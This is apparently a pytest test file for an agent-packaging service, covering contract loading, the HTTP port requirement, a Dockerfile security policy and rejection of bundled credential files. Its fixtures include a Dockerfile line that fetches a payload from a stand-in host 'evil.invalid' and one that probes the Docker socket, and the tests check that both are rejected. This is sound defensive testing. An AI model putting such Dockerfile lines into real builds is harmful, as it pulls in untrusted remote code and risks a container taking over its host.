from pathlib import Path

import pytest

from app.core.exceptions import ValidationException
from app.services.agent_package import load_package_contract, reject_packaged_secrets
from app.services.image_builder import validate_dockerfile


def test_dockerfile_first_manifest_supports_multifile_projects(tmp_path: Path):
    (tmp_path / "Dockerfile").write_text("FROM python:3.12-slim\nCOPY . /app\nUSER 65532\nCMD [\"python\", \"/app/src/main.py\"]\n")
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "main.py").write_text("print('ok')")
    (tmp_path / "agent-eval.yaml").write_text(
        "schema_version: 1\nbuild:\n  dockerfile: Dockerfile\n  context: .\nruntime:\n  protocol: stdio\nsecurity:\n  network: none\n"
    )

    contract = load_package_contract(tmp_path)

    assert contract.build.mode == "dockerfile"
    assert contract.runtime.protocol == "stdio"
    assert contract.build.dockerfile == "Dockerfile"


def test_legacy_agent_is_an_explicit_fallback(tmp_path: Path):
    (tmp_path / "agent.py").write_text("def run(task): return task")
    assert load_package_contract(tmp_path).build.mode == "legacy"


def test_project_without_dockerfile_or_legacy_entrypoint_is_rejected(tmp_path: Path):
    (tmp_path / "src").mkdir()
    with pytest.raises(ValidationException, match="Dockerfile"):
        load_package_contract(tmp_path)


def test_http_contract_requires_a_port(tmp_path: Path):
    (tmp_path / "Dockerfile").write_text("FROM scratch")
    (tmp_path / "agent-eval.yaml").write_text("schema_version: 1\nruntime:\n  protocol: http\n")
    with pytest.raises(ValidationException, match="runtime.port"):
        load_package_contract(tmp_path)


def test_dockerfile_policy_rejects_remote_add_and_docker_socket(tmp_path: Path):
    dockerfile = tmp_path / "Dockerfile"
    dockerfile.write_text("FROM alpine\nADD https://evil.invalid/payload /tmp/payload\n")
    with pytest.raises(ValidationException, match="远程 ADD"):
        validate_dockerfile(dockerfile)
    dockerfile.write_text("FROM alpine\nRUN test -S /var/run/docker.sock\n")
    with pytest.raises(ValidationException, match="Docker Socket"):
        validate_dockerfile(dockerfile)


def test_packaged_credentials_are_rejected(tmp_path: Path):
    (tmp_path / ".env").write_text("API_KEY=secret")
    with pytest.raises(ValidationException, match="凭据文件"):
        reject_packaged_secrets(tmp_path)
